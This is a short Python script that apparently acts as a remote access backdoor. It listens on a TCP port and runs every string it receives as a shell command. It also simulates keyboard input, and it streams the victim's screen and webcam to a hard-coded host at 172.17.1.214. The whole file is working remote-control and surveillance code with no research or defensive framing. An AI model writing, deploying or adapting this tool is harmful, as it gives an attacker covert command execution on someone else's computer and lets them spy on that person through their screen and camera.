import socket
import os
import pyautogui
from vidstream import ScreenShareClient
from vidstream import CameraClient


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("172.17.1.214", 22223))
ip = s.getsockname()[0]
port = 22223
s.close()

ipScreen = "172.17.1.214"
port = 22228
run = True

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen()

(client, address) = server.accept()
print("connect")

def receive():
    data = client.recv(1024)
    return data.decode()


def terminal(command):
    os.system(command)


def cdAccess(cd):
    os.chdir(cd)


def write(text):
    pyautogui.write(text)


def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")

def camera():
    client1 = CameraClient(ipScreen, 22225)
    client1.start_stream()
def screen():
    sender = ScreenShareClient(ipScreen, 22224)
    sender.start_stream()


def execute(data):
    global run
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "screen":
        screen()
    elif data == "camera":
        camera()
    else:
        terminal(data)


while run == True:
    execute(receive())
